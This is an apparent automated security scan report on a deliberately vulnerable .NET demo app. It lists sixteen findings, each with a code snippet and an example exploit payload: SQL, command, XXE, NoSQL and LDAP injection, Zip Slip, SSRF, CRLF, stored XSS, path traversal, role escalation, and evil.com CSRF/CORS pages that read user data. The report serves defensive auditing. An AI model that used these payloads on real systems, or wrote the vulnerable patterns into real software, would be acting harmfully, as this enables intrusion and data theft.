# 🔒 CodeMender Security Report

*Generated: 2026-08-20 08:49:13 UTC*

## Summary

**Total findings: 16**

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 2 |
| 🟠 HIGH | 14 |

| Status | Count |
|--------|-------|
| 🔴 OPEN | 16 |

## Findings

| ID | Severity | Confidence | Status | Fix | File | Title |
|----|----------|------------|--------|-----|------|-------|
| `ab2fcc60` | 🔴 CRITICAL | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableDatabaseService.cs` | SQL Injection via String Concatenation in VulnerableDatabaseService |
| `006c3e7b` | 🔴 CRITICAL | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableCommandService.cs` | Command Injection in ExecuteCommandVulnerable of VulnerableCommandService |
| `1caf1fd6` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableXMLService.cs` | XML Injection via Raw String Interpolation in SaveProfileVulnerable |
| `6e3d404d` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableNoSQLService.cs` | NoSQL Injection via Dynamic JSON/BSON Construction in AuthenticateUserVulnerable |
| `a79175c4` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Services/VulnerableLdapService.cs` | LDAP Injection via String Concatenation in VulnerableLdapService |
| `86ad05e6` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/ZipSlipController.cs` | Zip Slip / Arbitrary File Write via Malicious ZIP Archive Extraction |
| `93ef8e6b` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/XxeInjectionController.cs` | XML External Entity (XXE) Injection in Process XML Endpoint |
| `508fb1ac` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/XssSvgController.cs` | Server-Side Request Forgery (SSRF) via SVG Image Embedding |
| `c354c4f6` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/VulnerableRedirectController.cs` | CRLF Injection / HTTP Response Splitting in Vulnerable Redirect Endpoint |
| `ae20f16f` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/VulnerableFileUploadController.cs` | Stored Cross-Site Scripting (XSS) via File Upload and Forced HTML Content-Type |
| `c0463304` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/SsrfController.cs` | Server-Side Request Forgery (SSRF) in URL Fetching Endpoint |
| `2fad6c29` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/PathTraversalController.cs` | Path Traversal in Download File Endpoint |
| `8e8dc520` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/IdorController.cs` | Privilege Escalation via Mass Assignment / Over-posting in Registration Endpoint |
| `6ae9a905` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/CsrfController.cs` | Cross-Site Request Forgery (CSRF) in CsrfController due to IgnoreAntiforgeryToken and permissive CORS |
| `76e22981` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Program.cs` | Permissive CORS Configuration (Wildcard Origin + AllowCredentials) |
| `41a30a92` | 🟠 HIGH | 100% | OPEN | — | `DotnetSecurityFailures/Controllers/ArbitraryFileWriteController.cs` | Arbitrary File Write / Path Traversal via Filename Parameter in Backup Endpoint |

## Details

### 1. 🔴 SQL Injection via String Concatenation in VulnerableDatabaseService (`ab2fcc60`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableDatabaseService.cs` (L67–101)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableDatabaseService` contains a `SearchUserVulnerable` method that takes a `username` string and directly concatenates it into the SQL command: `SELECT * FROM Users WHERE Username = '{username}' AND IsActive = 1`. This allows SQL Injection when users supply input through the `SqlInjection.razor` page.

Conceptual Exploit Payload:
The input string:
`admin' OR '1'='1`
will produce the SQL query:
`SELECT * FROM Users WHERE Username = 'admin' OR '1'='1' AND IsActive = 1`
which bypasses the specific username filter and returns all users. Alternatively:
`admin' UNION SELECT 1, SecretKey, SecretValue, 1, 1 FROM Secrets --`
to perform a UNION-based SQL injection to exfiltrate secrets.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: String concatenation - SQL Injection vulnerability
    public string SearchUserVulnerable(string username)
    {
        EnsureInitialized();

        try
        {
            // DANGEROUS: Direct string concatenation with additional WHERE condition
            var sql = $"SELECT * FROM Users WHERE Username = '{username}' AND IsActive = 1";
            
            using var command = _connection.CreateCommand();
            command.CommandText = sql;

            using var reader = command.ExecuteReader();
```

</details>

---

### 2. 🔴 Command Injection in ExecuteCommandVulnerable of VulnerableCommandService (`006c3e7b`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: Command Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableCommandService.cs` (L21–44)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableCommandService` has an `ExecuteCommandVulnerable` function that is called from `CommandInjection.razor` component's `ProcessText` method. It directly interpolates untrusted `userInput` into the `processInfo.Arguments` string (e.g., `processInfo.Arguments = $"/c echo Processing: {userInput}"` or `processInfo.Arguments = $"-c \"echo Processing: {userInput}\""`) and executes Kestrel/cmd/sh subprocesses. This results in Command Injection if special shell command separators/operators are used.

Conceptual Exploit Payload:
The input string:
`test & whoami`
will lead to the execution of `cmd.exe /c echo Processing: test & whoami`, which outputs "Processing: test" followed by the output of the `whoami` command.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE CODE - for demonstration purposes
    public string ExecuteCommandVulnerable(string userInput)
    {
        try
        {
            var processInfo = new ProcessStartInfo
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                processInfo.FileName = "cmd.exe";
                processInfo.Arguments = $"/c echo Processing: {userInput}";
            }
            else
            {
                processInfo.FileName = "/bin/sh";
                processInfo.Arguments = $"-c \"echo Processing: {userInput}\"";
            }

            using var process = Process.Start(processInfo);
```

</details>

---

### 3. 🔴 XML Injection via Raw String Interpolation in SaveProfileVulnerable (`1caf1fd6`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableXMLService.cs` (L9–26)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableXMLService`'s `SaveProfileVulnerable` method constructs XML via raw string interpolation on the fields `fullName`, `email`, and `bio`. It then parses this with `doc.LoadXml(xmlString)` and queries it using XPath. This allows XML Injection, where an attacker can close existing XML elements and inject their own elements (like `<role>admin</role>` or `<isAdmin>true</isAdmin>`), which get processed by the system because `doc.SelectSingleNode` or `doc.SelectNodes` will match the first element found.

Conceptual Exploit Payload:
Using the `bio` field, the attacker can submit:
`test</bio><role>admin</role><isAdmin>true</isAdmin><balance>999999</balance><bio>test`
When interpolated, the XML becomes:
```xml
<user>
  <name>test</name>
  <email>test@example.com</email>
  <bio>test</bio><role>admin</role><isAdmin>true</isAdmin><balance>999999</balance><bio>test</bio>
  <role>user</role>
  <balance>100</balance>
  <isAdmin>false</isAdmin>
</user>
```
The newly injected tags come before the original ones, and since the XML parser reads them sequentially and XPath selecting `//role` returns all matched tags, the application takes the first match (the injected admin value) as the primary value.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: String concatenation in XML generation
    public XmlParseResult SaveProfileVulnerable(string fullName, string email, string bio)
    {
        try
        {
            // DANGEROUS: String concatenation allows XML injection
            string xmlString = $@"<user>
  <name>{fullName}</name>
  <email>{email}</email>
  <bio>{bio}</bio>
  <role>user</role>
  <balance>100</balance>
  <isAdmin>false</isAdmin>
</user>";
```

</details>

---

### 4. 🔴 NoSQL Injection via Dynamic JSON/BSON Construction in AuthenticateUserVulnerable (`6e3d404d`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableNoSQLService.cs` (L57–89)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableNoSQLService`'s `AuthenticateUserVulnerable` method takes `username` and `password` strings and builds a JSON string dynamically by raw string concatenation: `$"{{ \"username\": {username}, \"password\": {password} }}"`. This JSON is then parsed using `JsonSerializer.Deserialize` and used as a BSON filter to authenticate users. If an attacker inputs JSON structures or NoSQL injection operators (e.g. `{"$ne": "something"}`), they can manipulate the query logic, leading to NoSQL Injection.

Conceptual Exploit Payload:
To bypass authentication and log in as "admin" without knowing the password, the attacker can supply:
`username` as `"admin"`
`password` as `{"$ne": ""}`
This creates the JSON filter:
`{ "username": "admin", "password": {"$ne": ""} }`
Which parses correctly and evaluates to `true` (since admin's password is not empty), allowing the authentication to succeed.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: String concatenation in query construction
    public BsonDocument? AuthenticateUserVulnerable(string username, string password)
    {
        try
        {
            // DANGEROUS: Building query by concatenating user input into JSON string
            // User input is NOT escaped, allowing injection of JSON operators
            var queryJson = $"{{ \"username\": {username}, \"password\": {password} }}";
            
            // Parse and deserialize - attackers can inject operators here!
            var jsonDoc = System.Text.Json.JsonSerializer.Deserialize<JsonDocument>(queryJson);
```

</details>

---

### 5. 🔴 LDAP Injection via String Concatenation in VulnerableLdapService (`a79175c4`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Services/VulnerableLdapService.cs` (L62–68)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableLdapService` contains a `SearchUserVulnerable` method that takes a `username` string and directly concatenates it into the LDAP filter: `(&(objectClass=user)(cn={username}))`. This allows LDAP Injection because special LDAP query operators can be injected.

Conceptual Exploit Payload:
The input string:
`*`
will produce the LDAP filter:
`(&(objectClass=user)(cn=*))`
which matches all users in the directory and returns their details. Alternatively, using logic manipulation:
`admin)(&(objectClass=*`
resolves to:
`(&(objectClass=user)(cn=admin)(&(objectClass=*))`
which also alters the logic structure of the query.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    public string SearchUserVulnerable(string username)
    {
        // DANGEROUS: Direct string concatenation in LDAP filter
        var filter = $"(&(objectClass=user)(cn={username}))";
        
        return EvaluateLdapFilter(filter, username);
    }
```

</details>

---

### 6. 🔴 Zip Slip / Arbitrary File Write via Malicious ZIP Archive Extraction (`86ad05e6`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/ZipSlipController.cs` (L60–101)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ZipSlipController` extracts uploaded zip archives using `entry.ExtractToFile(fullPath, overwrite: true)`. It computes `fullPath` via `Path.GetFullPath(Path.Combine(ExtractDirectory, entry.FullName))` without checking whether `fullPath` starts with the `ExtractDirectory` BEFORE extracting the file. This is a classic Zip Slip vulnerability where a directory traversal sequence inside the Zip entry's filename resolves to a path outside the destination directory, enabling arbitrary file write.

Conceptual Exploit Payload:
Create a ZIP archive containing a file named `../../../../etc/cron.d/malicious_cron` (or similar depending on platform) or a file referencing paths outside the extraction directory. Upload this ZIP archive to the `/api/zip/extract` endpoint using multipart form-data:
POST /api/zip/extract HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=boundary

--boundary
Content-Disposition: form-data; name="zipFile"; filename="slip.zip"
Content-Type: application/zip

[ZIP Archive Binary Data with a traversal entry like ../evil.txt]
--boundary--

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
                    // VULNERABLE: No validation before extraction
                    var fullPath = Path.GetFullPath(Path.Combine(ExtractDirectory, entry.FullName));
...
                        entry.ExtractToFile(fullPath, overwrite: true);
```

</details>

---

### 7. 🔴 XML External Entity (XXE) Injection in Process XML Endpoint (`93ef8e6b`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Controllers/XxeInjectionController.cs` (L44–60)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `XxeInjectionController` contains two vulnerable XML endpoints: `process-user` and `parse`. In `process-user`, it instantiates `XmlDocument` and explicitly sets `XmlResolver = new XmlUrlResolver()` before calling `LoadXml()`. In `parse`, it sets `DtdProcessing = DtdProcessing.Parse` and `XmlResolver = new XmlUrlResolver()`. Both configurations enable resolving XML External Entities (XXE), allowing an attacker to read local system files or trigger server-side requests (SSRF) via external DTDs or entities.

Conceptual Exploit Payload:
POST /api/xxe/process-user HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "XmlContent": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><user><name>&xxe;</name><email>test@test.com</email><bio>test</bio></user>"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // VULNERABLE: Explicitly enabling XmlResolver
            var doc = new XmlDocument();
            doc.XmlResolver = new XmlUrlResolver(); // DANGEROUS!
            doc.LoadXml(request.XmlContent);
```

</details>

---

### 8. 🔴 Server-Side Request Forgery (SSRF) via SVG Image Embedding (`508fb1ac`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: SSRF
- **File**: `DotnetSecurityFailures/Controllers/XssSvgController.cs` (L35–116)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `XssSvgController` accepts arbitrary SVG xml content, parses it, finds all `<image>` tags with an `href` attribute, and then fetches the target resource via `_httpClient.GetAsync(href)` on the server side (acting as an SSRF vulnerability). This can be used to scan/retrieve internal ports and services, similar to the main SSRF controller.

Conceptual Exploit Payload:
POST /api/vulnerabilities/xss-svg/process HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "SvgContent": "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://127.0.0.1:5003/\" /></svg>"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    [HttpPost("process")]
    [IgnoreAntiforgeryToken]
    public async Task<IActionResult> ProcessSvg([FromBody] SvgUploadRequest request)
    {
...
            var doc = XDocument.Parse(request.SvgContent);
            var ns = XNamespace.Get("http://www.w3.org/2000/svg");

            var images = doc.Descendants(ns + "image")
                .Select(e => e.Attribute("href")?.Value ?? e.Attribute(XNamespace.Get("http://www.w3.org/1999/xlink") + "href")?.Value)
                .Where(href => !string.IsNullOrEmpty(href) && !href.StartsWith("data:"))
                .ToList();

            // DANGEROUS: Fetch each external URL (SSRF risk)
            foreach (var href in images)
            {
...
                    var response = await _httpClient.GetAsync(href);
```

</details>

---

### 9. 🔴 CRLF Injection / HTTP Response Splitting in Vulnerable Redirect Endpoint (`c354c4f6`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Controllers/VulnerableRedirectController.cs` (L10–38)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableRedirectController` performs `System.Web.HttpUtility.UrlDecode(url)` on the query parameter `url` and then directly interpolates it into `rawResponse` containing `Location: {decodedUrl}\r\n`. Although the response is served as `text/plain` for demonstration purposes, it shows how CRLF Injection (HTTP Response Splitting / Header Injection) works when constructing raw HTTP responses.

Conceptual Exploit Payload:
GET /api/redirect/vulnerable?url=http://google.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
Host: example.com

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Raw HTTP response construction with user input
    [HttpGet("vulnerable")]
    public async Task VulnerableRedirect([FromQuery] string url)
    {
...
        var decodedUrl = System.Web.HttpUtility.UrlDecode(url);

        // DANGER: Building raw HTTP response with user input
        // This demonstrates how CRLF injection works
        var rawResponse = "HTTP/1.1 302 Found\r\n" +
                      $"Location: {decodedUrl}\r\n" +
                      "X-Powered-By: VulnerableApp\r\n" +
                      "Content-Type: text/html; charset=utf-8\r\n" +
                      "Server: Kestrel\r\n" +
                      "\r\n" +
                      "<html><body>Redirecting...</body></html>";
```

</details>

---

### 10. 🔴 Stored Cross-Site Scripting (XSS) via File Upload and Forced HTML Content-Type (`ae20f16f`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/VulnerableFileUploadController.cs` (L57–75)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `VulnerableFileUploadController` lets users upload arbitrary files via the `upload` endpoint. When viewing these uploaded files via `/api/files/view/{fileId}`, the server always returns them with a `Content-Type: text/html` header, even if they are HTML or contain embedded JavaScript, without any validation or sanitization. This leads to Stored Cross-Site Scripting (XSS).

Conceptual Exploit Payload:
1. Upload malicious file:
POST /api/files/upload HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "Filename": "xss.html",
  "Content": "<html><body><script>alert(document.domain)</script></body></html>"
}

2. Execute XSS by requesting:
GET /api/files/view/{returned-fileId} HTTP/1.1
Host: example.com

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Serves files without proper Content-Type validation
    [HttpGet("view/{fileId}")]
    public IActionResult ViewFile(string fileId)
    {
...
        // VULNERABLE: Always serves as text/html without validation!
        // This allows XSS when HTML files with scripts are uploaded
        return File(fileBytes, "text/html");
    }
```

</details>

---

### 11. 🔴 Server-Side Request Forgery (SSRF) in URL Fetching Endpoint (`c0463304`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: SSRF
- **File**: `DotnetSecurityFailures/Controllers/SsrfController.cs` (L29–43)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `SsrfController`'s `FetchUrl` endpoint accepts an arbitrary user-controlled `url` query parameter and immediately requests it via `_httpClient.GetAsync(url)` without any validation or sanitization. This allows an attacker to fetch arbitrary internal HTTP endpoints (Server-Side Request Forgery), such as loopback interfaces, AWS/metadata services, or private subnet resources.

Conceptual Exploit Payload:
GET /api/vulnerabilities/ssrf/fetch?url=http://127.0.0.1:5003/ HTTP/1.1
Host: example.com

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: No URL validation - allows SSRF attacks
    [HttpGet("fetch")]
    public async Task<IActionResult> FetchUrl([FromQuery] string url)
    {
        LogDemoActivity("FetchUrl", $"Fetching URL: {url}");
        
        if (string.IsNullOrWhiteSpace(url))
        {
            return BadRequest(new { success = false, message = "URL is required" });
        }

        try
        {
            // VULNERABLE: Fetches ANY URL without validation
            var response = await _httpClient.GetAsync(url);
```

</details>

---

### 12. 🔴 Path Traversal in Download File Endpoint (`2fad6c29`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/PathTraversalController.cs` (L34–52)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `PathTraversalController`'s `DownloadFile` endpoint takes a `filename` query parameter and uses `Path.Combine(DocumentsPath, filename)` directly to determine the path to read. It does not sanitize the `filename` input, allowing directory traversal sequences like `../../` to be resolved to arbitrary locations on the host file system.

Conceptual Exploit Payload:
GET /api/vulnerabilities/path-traversal/download?filename=../../Program.cs HTTP/1.1
Host: example.com

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Direct path concatenation without validation
    [HttpGet("download")]
    public IActionResult DownloadFile([FromQuery] string filename)
    {
        LogDemoActivity("DownloadFile", $"Attempting to download: {filename}");
        
        if (string.IsNullOrWhiteSpace(filename))
        {
            return BadRequest(new { success = false, message = "Filename is required" });
        }

        // VULNERABLE: User input directly concatenated to path
        var filePath = Path.Combine(DocumentsPath, filename);
```

</details>

---

### 13. 🔴 Privilege Escalation via Mass Assignment / Over-posting in Registration Endpoint (`8e8dc520`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Injection
- **File**: `DotnetSecurityFailures/Controllers/IdorController.cs` (L43–74)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `IdorController` contains two major vulnerabilities:
1. Insecure Direct Object Reference (IDOR) on the `profile` endpoint. The ID parameters are read from the query (`?id=`), and there is no verification whether the authenticated user has authorization to access the profile corresponding to that ID.
2. Mass Assignment (Privilege Escalation / Over-posting) on the `register` endpoint. The application accepts the `Role` property directly from the user request payload and registers the user with that role, allowing an attacker to assign themselves the "Admin" or "SuperAdmin" roles.

Conceptual Exploit Payload for IDOR:
GET /api/vulnerabilities/idor/profile?id=999 HTTP/1.1
Host: example.com

Conceptual Exploit Payload for Mass Assignment:
POST /api/vulnerabilities/idor/register HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "Username": "attacker",
  "Email": "attacker@example.com",
  "Password": "password123",
  "Role": "Admin"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // VULNERABLE: Accepts role from user input during registration!
    [HttpPost("register")]
    public IActionResult Register([FromBody] RegistrationRequest request)
```

</details>

---

### 14. 🔴 Cross-Site Request Forgery (CSRF) in CsrfController due to IgnoreAntiforgeryToken and permissive CORS (`6ae9a905`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Controllers/CsrfController.cs` (L42–45)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `CsrfController`'s `MakePurchase` and `ResetBalance` endpoints are configured with `[IgnoreAntiforgeryToken]` and don't validate any CSRF tokens. This combined with `[EnableCors("VulnerablePolicy")]` makes them highly susceptible to Cross-Site Request Forgery (CSRF). A malicious web site can make requests on behalf of a logged-in user to purchase products or perform other actions.

Conceptual Exploit Payload:
An attacker hosts a malicious website on `http://evil.com` with the following HTML/JS:
```html
<form id="csrfForm" action="https://localhost:7124/api/vulnerabilities/csrf/purchase" method="POST" enctype="application/json">
  <input type="hidden" name="ProductName" value="EvilProduct" />
  <input type="hidden" name="Amount" value="1000.00" />
</form>
<script>
  // Since simple forms cannot easily send JSON unless fetched, the attacker uses standard fetch/XHR with credentials:
  fetch('https://localhost:7124/api/vulnerabilities/csrf/purchase', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ ProductName: 'EvilProduct', Amount: 1000.00 }),
    credentials: 'include'
  });
</script>
```

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    [HttpPost("purchase")]
    [IgnoreAntiforgeryToken]
    public IActionResult MakePurchase([FromBody] PurchaseRequest request)
```

</details>

---

### 15. 🔴 Permissive CORS Configuration (Wildcard Origin + AllowCredentials) (`76e22981`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Web Security
- **File**: `DotnetSecurityFailures/Program.cs` (L35–43)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The application configures an overly permissive CORS policy named "VulnerablePolicy" and applies it globally using `app.UseCors("VulnerablePolicy")` and on `CorsMisconfigurationController`. This policy uses `SetIsOriginAllowed(_ => true)` alongside `AllowCredentials()`. This combination allows any external origin to read response data from endpoints with credentials enabled, facilitating cross-origin data exposure (such as retrieving API keys, balance, and sensitive user data from a malicious website via fetch/XHR).

Conceptual Exploit Payload:
An attacker hosts a malicious website on `http://evil.com` with the following JavaScript:
```javascript
fetch('https://localhost:7124/api/user/balance', { credentials: 'include' })
  .then(response => response.json())
  .then(data => console.log(data));
```
Because of the CORS policy, the browser allows `http://evil.com` to read the response from `https://localhost:7124/api/user/balance`.

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
    // DANGEROUS: Reflects any origin with credentials
    options.AddPolicy("VulnerablePolicy", policy =>
    {
        policy
            .SetIsOriginAllowed(_ => true) // CRITICAL: Allows ALL origins!
            .AllowAnyMethod()
            .AllowAnyHeader()
            .AllowCredentials(); // With credentials = VERY DANGEROUS!
    });
```

</details>

---

### 16. 🔴 Arbitrary File Write / Path Traversal via Filename Parameter in Backup Endpoint (`41a30a92`)

- **Severity**: 🟠 HIGH
- **Status**: OPEN
- **Type**: Path Traversal
- **File**: `DotnetSecurityFailures/Controllers/ArbitraryFileWriteController.cs` (L45–49)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

The `ArbitraryFileWriteController`'s `SaveBackup` endpoint accepts user input `request.FileName` and `request.Content` in a JSON payload. It directly combines `_baseDirectory` with `request.FileName` using `Path.Combine` and writes the `request.Content` using `System.IO.File.WriteAllText` without validating that the path does not escape the base directory (such as by using path traversal sequences like `../../`).

Conceptual Exploit Payload:
POST /api/vulnerabilities/arbitrary-file-write/save HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "FileName": "../../../test.txt",
  "Content": "vulnerable"
}

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
            // VULNERABLE: Direct path concatenation without validation
            var filePath = Path.Combine(_baseDirectory, request.FileName);
            
            System.IO.File.WriteAllText(filePath, request.Content);
```

</details>

---

